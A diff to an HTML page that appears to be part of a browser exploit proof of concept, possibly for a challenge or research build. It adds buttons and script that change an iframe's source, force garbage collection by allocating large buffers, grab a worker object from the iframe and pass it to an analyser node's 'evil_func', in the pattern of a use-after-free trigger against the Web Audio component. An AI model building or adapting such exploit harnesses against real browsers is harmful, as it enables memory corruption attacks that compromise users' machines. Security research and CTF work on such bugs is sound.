@@ -24,11 +24,18 @@ index.html
 </body> -->
 
 <body>
-<button onclick="trigger()">Trigger</button>
 <iframe id="frame" src="http://127.0.0.1/tmp.html"></iframe>
+<br>
+<button onclick="trigger()">Trigger</button>
+<button onclick="query()">Query</button>
+<br>
+<p id="log">
+</p>
+<br>
 <script>
 let audioContext;
 let analyserNode;
+let worker;
 
 function gc() {
     for (let i = 0; i < 0x50; i++) { new ArrayBuffer(0x1000000); }
@@ -37,10 +44,14 @@ function trigger() {
     document.getElementById("frame").src = "http://127.0.0.1/tmp2.html";
     gc();
 }
-function query() {    
-    analyserNode.evil_func(analyserNode);
+function query() {
+    analyserNode.evil_func(worker);
 }
 
+
+window.addEventListener("message", (event) => {
+    worker = window.frames[0].document.getElementById("worker");
+}, false);
 try {
     audioContext = new AudioContext();
 } catch(e) {
